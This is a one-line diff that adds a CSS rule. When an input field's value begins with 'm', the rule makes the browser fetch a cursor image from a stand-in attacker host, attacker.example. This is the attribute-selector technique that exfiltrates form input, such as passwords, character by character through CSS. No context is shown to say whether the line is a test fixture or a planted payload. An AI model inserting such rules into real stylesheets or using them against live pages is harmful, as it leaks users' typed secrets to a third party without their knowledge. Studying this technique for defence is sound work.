@@ -1,0 +1,1 @@
+@media screen { input[value^="m"] { cursor: url("https://attacker.example/m"), auto; } }
